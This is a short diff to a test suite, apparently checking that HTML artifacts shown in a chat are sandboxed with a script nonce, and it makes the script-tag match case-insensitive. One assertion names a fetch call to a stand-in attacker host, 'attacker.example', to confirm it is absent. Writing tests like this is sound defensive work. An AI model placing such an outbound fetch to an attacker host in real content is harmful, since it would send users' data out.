@@ -104,7 +104,7 @@ describe("an HTML artifact in the chat", () => {
     const srcDoc = srcDocOf(container);
     const nonce = /script-src 'nonce-([0-9a-f]+)'/.exec(srcDoc)?.[1];
     expect(nonce).toBeDefined();
-    const scripts = srcDoc.match(/<script\b[^>]*>/g) ?? [];
+    const scripts = srcDoc.match(/<script\b[^>]*>/gi) ?? [];
     expect(scripts).toEqual([`<script nonce="${nonce}">`]);
     expect(srcDoc).not.toContain('fetch("https://attacker.example")');
   });
